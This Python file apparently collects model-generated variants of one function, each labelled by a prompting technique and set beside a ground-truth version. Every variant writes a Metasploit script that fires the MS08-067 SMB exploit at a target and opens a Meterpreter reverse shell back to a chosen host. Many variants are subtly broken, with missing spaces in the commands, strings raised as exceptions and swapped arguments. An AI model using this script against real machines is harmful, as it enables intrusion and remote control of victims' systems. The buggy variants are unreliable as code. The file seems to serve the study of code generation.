import ipaddress
import os
import pathlib
import sys

def ground_truth_code_confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

def persona_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as f:
        f.write('use exploit/windows/smb/ms08_067_netapi\n')
        f.write('set RHOST'+ str(tgtHost) + '\n')
        f.write('set payload'+ 'windows/meterpreter/reverse_tcp\n')
        f.write('set LPORT'+ str(lport) + '\n')
        f.write('set LHOST'+ lhost + '\n')
        f.write('exploit -j -z\n')
        
def template_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        if not isinstance(configFile, str) or not isinstance(tgtHost, str) or not isinstance(lhost, str) or not isinstance(lport, int):
            raise TypeError('Invalid input type')
        with open(configFile, 'w') as f:
            f.write('use exploit/windows/smb/ms08_067_netapi\n')
            f.write('set RHOST'+ str(tgtHost) + '\n')
            f.write('set payload'+ 'windows/meterpreter/reverse_tcp\n')
            f.write('set LPORT'+ str(lport) + '\n')
            f.write('set LHOST'+ lhost + '\n')
            f.write('exploit -j -z\n')
    except TypeError as e:
       raise('TypeError:'+ str(e))
    except Exception as e:
       raise('An error occurred:'+ str(e))
        
def question_refinement_confickerExploit(tgtHost, lhost, lport):
    try:
        with open('conficker_config.rc', 'w') as configFile:
            configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
            configFile.write('set RHOST'+ tgtHost + '\n')
            configFile.write('set payload windows/meterpreter/reverse_tcp\n')
            configFile.write('set LPORT'+ str(lport) + '\n')
            configFile.write('set LHOST'+ lhost + '\n')
            configFile.write('exploit -j -z\n')
    except Exception as e:
       raise('An error occurred:'+ str(e))
    finally:
        pass
    
def alternative_approaches_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write('set RHOST'+ str(tgtHost) + '\n')
            file.write('set payload'+ 'windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT'+ str(lport) + '\n')
            file.write('set LHOST'+ lhost + '\n')
            file.write('exploit -j -z\n')
    except FileNotFoundError:
        raise('The file or directory was not found.')
    except PermissionError:
        raise('You do not have permission to access this file.')
    except Exception as e:
       raise('An error occurred:'+ str(e))
    return configFile

def context_manager_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as f:
        f.write('use exploit/windows/smb/ms08_067_netapi\n')
        f.write('set RHOST'+ tgtHost + '\n')
        f.write('set payload'+ 'windows/meterpreter/reverse_tcp\n')
        f.write('set LPORT'+ str(lport) + '\n')
        f.write('set LHOST'+ lhost + '\n')
        f.write('exploit -j -z\n')
        
def flipped_interaction_3__confickerExploit(configFile, tgtHost, lhost, lport):
	try:
		if not (tgtHost.replace('.', '', 3).isdigit() or tgtHost.replace('-', '.', 1).isalnum()) or not (lhost.replace('.', '', 3).isdigit() or lhost.replace('-', '.', 1).isalnum()):
			raise ValueError("Invalid tgtHost or lhost. Please provide a valid IP address or hostname")
		if not isinstance(lport, int) or not 0 <= lport <= 65535:
			raise ValueError("Invalid lport. Please provide a valid port number between 0 and 65535")
		with open(configFile, 'w') as f:
			f.write('use exploit/windows/smb/ms08_067_netapi\n')
			f.write('set RHOST'+ str(tgtHost) + '\n')
			f.write('set payload '+'windows/meterpreter/reverse_tcp\n')
			f.write('set LPORT'+ str(lport) + '\n')
			f.write('set LHOST'+ str(lhost) + '\n')
			f.write('exploit -j -z\n')
	except IOError as e:
		raise(f"An IO error occurred: {e}")
	except Exception as e:
		raise(f"An unexpected error occurred: {e}")
            
def flipped_interaction_4__confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        ipaddress.ip_address(tgtHost)
        ipaddress.ip_address(lhost)
        if not isinstance(lport, int) or not 1 <= lport <= 65535:
            raise ValueError()
        with open(configFile, 'w') as f:
            f.write('use exploit/windows/smb/ms08_067_netapi\n')
            f.write('set RHOST'+ tgtHost + '\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write('set LPORT'+ str(lport) + '\n')
            f.write('set LHOST'+ lhost + '\n')
            f.write('exploit -j -z\n')
    except ValueError as e:
        raise(f'Error validating input: {e}')
    except IOError as e:
        raise(f'Error writing to {configFile}: {e}')
        
def flipped_ineraction_5__confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write('set RHOST' + str(tgtHost) + '\n')
            file.write('set payload '+'windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT' + str(lport) + '\n')
            file.write('set LHOST' + lhost + '\n')
            file.write('exploit -j -z\n')
    except FileNotFoundError:
        raise(f"Error: {configFile} not found.")
    except PermissionError:
        raise(f"Error: Insufficient permissions to write to {configFile}.")
    except IOError as e:
       raise(f"Error: An IO error occurred while writing to {configFile}: {e}")
        
def iterative_prompting_3__confickerExploit(config_file, tgt_host, lhost, lport):
    if not isinstance(config_file, str):
        raise TypeError("config_file must be a string")
    if not isinstance(tgt_host, str):
        raise TypeError("tgt_host must be a string")
    if not isinstance(lhost, str):
        raise TypeError("lhost must be a string")
    if not isinstance(lport, int):
        raise TypeError("lport must be an integer")
    if lport < 1 or lport > 65535:
        raise ValueError("lport must be a valid port number")
    try:
        with open(config_file, "w") as file_object:
            file_object.write("use exploit/windows/smb/ms08_067_netapi\n")
            file_object.write(f"set RHOST {tgt_host}\n")
            file_object.write("set payload windows/meterpreter/reverse_tcp\n")
            file_object.write(f"set LPORT {lport}\n")
            file_object.write(f"set LHOST {lhost}\n")
            file_object.write("exploit -j -z\n")
    except FileNotFoundError:
        raise(f"Error: Config file {config_file} not found")
    except PermissionError:
        raise(f"Error: No permission to write to config file {config_file}")
    except OSError as e:
       raise(f"Error: Failed to write to config file - {e}")
    except Exception as e:
       raise(f"An unexpected error occurred - {e}")
        
def iterative_prompting_4__confickerExploit(configFile, tgtHost, lhost, lport):
    if not isinstance(configFile, str):
        raise TypeError("configFile must be a string")
    if not configFile.strip():
        raise ValueError("configFile cannot be empty")
    if not isinstance(tgtHost, str):
        tgtHost = str(tgtHost)
    if not isinstance(lhost, str):
        raise TypeError("lhost must be a string")
    if not lhost.strip():
        raise ValueError("lhost cannot be empty")
    if not isinstance(lport, int):
        raise TypeError("lport must be an integer")
    if lport < 1 or lport > 65535:
        raise ValueError("lport must be between 1 and 65535")
    
    try:
        with open(configFile, "w", newline="", encoding="utf-8") as f:
            f.write("use exploit/windows/smb/ms08_067_netapi\n")
            f.write(f"set RHOST {tgtHost}\n")
            f.write("set payload windows/meterpreter/reverse_tcp\n")
            f.write(f"set LPORT {lport}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write("exploit -j -z\n")
    except PermissionError:
        raise(f"Permission denied: unable to write to file {configFile}")
    except OSError as e:
       raise(f"Error: {str(e)}")
    except Exception as e:
       raise(f"Error: {str(e)}")
              
def iterative_prompting_5__confickerExploit(config_file, tgt_host, lhost, lport):
    if not isinstance(config_file, str) or not isinstance(tgt_host, str) or not isinstance(lhost, str):
        raise TypeError('config_file, tgt_host and lhost must be strings')
    if not isinstance(lport, int):
        raise TypeError('lport must be an integer')
    config_file_path = pathlib.Path(config_file)
    if not config_file_path.parent.exists():
        os.makedirs(config_file_path.parent, exist_ok=True)
    if not config_file_path.parent.is_dir():
        raise ValueError(f'{config_file_path.parent} is not a directory')
    if not tgt_host:
        raise ValueError('tgt_host cannot be empty')
    if not lhost:
        raise ValueError('lhost cannot be empty')
    if lport < 1 or lport > 65535:
        raise ValueError('lport must be within the range 1-65535')
    try:
        with open(config_file, 'w') as f:
            f.write('use exploit/windows/smb/ms08_067_netapi\n')
            f.write('set RHOST '+ str(tgt_host) + '\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write('set LPORT '+ str(lport) + '\n')
            f.write('set LHOST '+ lhost + '\n')
            f.write('exploit -j -z\n')
    except Exception as e:
       raise(f'An error occurred: {e}')
        
def few_shots_prompting_confickerExploit(configFile, tgtHost, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/windows/smb/ms08_067_netapi\n')
		f.write('set RHOST'+ str(tgtHost) + '\n')
		f.write('set payload '+'windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT'+ str(lport) + '\n')
		f.write('set LHOST'+ lhost + '\n')
		f.write('exploit -j -z\n')
          
def cot_prompting_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as f:
        f.write('use exploit/windows/smb/ms08_067_netapi\n')
        f.write('set RHOST'+ str(tgtHost) + '\n')
        f.write('set payload'+ 'windows/meterpreter/reverse_tcp\n')
        f.write('set LPORT'+ str(lport) + '\n')
        f.write('set LHOST'+ lhost + '\n')
        f.write('exploit -j -z\n')
        
def fact_check_list_confickerExploit(configFile, tgtHost, lhost, lport):
    if not isinstance(configFile, str):
        raise TypeError("configFile must be a string")
    if not isinstance(tgtHost, str):
        raise TypeError("tgtHost must be a string")
    if not isinstance(lhost, str):
        raise TypeError("lhost must be a string")
    if not isinstance(lport, int):
        raise TypeError("lport must be an integer")
    configContent = (
        'use exploit/windows/smb/ms08_067_netapi\n'
      'set RHOST '+ tgtHost + '\n'
      'set payload windows/meterpreter/reverse_tcp\n'
      'set LPORT '+ str(lport) + '\n'
      'set LHOST '+ lhost + '\n'
        'exploit -j -z\n'
    )
    try:
        with open(configFile, 'w') as f:
            f.write(configContent)
    except Exception as e:
        raise IOError("Failed to write to file: " + str(e))
    
def not_interactive_mix_confickerExploit(configFile, tgtHost, lhost, lport):
    if not isinstance(tgtHost, str) or not isinstance(lhost, str):
        raise TypeError('tgtHost and lhost must be strings')
    if not isinstance(lport, int) or lport < 0 or lport > 65535:
        raise TypeError('lport must be an integer between 0 and 65535')
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write(f'set RHOST {tgtHost}\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
    except FileNotFoundError:
        raise(f'File {configFile} not found.')
    except PermissionError:
        raise(f'Permission denied to write to file {configFile}.')
    except Exception as e:
       raise(f'Error writing to file: {e}')
        
def interactive_mix_confickerExploit(configFile, tgtHost, lport, lhost):
    import ipaddress
    try:
        ipaddress.ip_address(tgtHost)
        ipaddress.ip_address(lhost)
    except ValueError:
        raise ValueError("Invalid IP address format for tgtHost or lhost")
    if not 1 <= lport <= 65535:
        raise ValueError("lport is out of valid range (1-65535)")
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST '+ str(tgtHost) + '\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT '+ str(lport) + '\n')
    configFile.write('set LHOST '+ lhost + '\n')
    configFile.write('exploit -j -z\n')
    
def baseline_confickerExploit(configFile, tgtHost, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/windows/smb/ms08_067_netapi\n')
		f.write('set RHOST'+ str(tgtHost) + '\n')
		f.write('set payload'+ 'windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT'+ str(lport) + '\n')
		f.write('set LHOST'+ lhost + '\n')
		f.write('exploit -j -z\n')
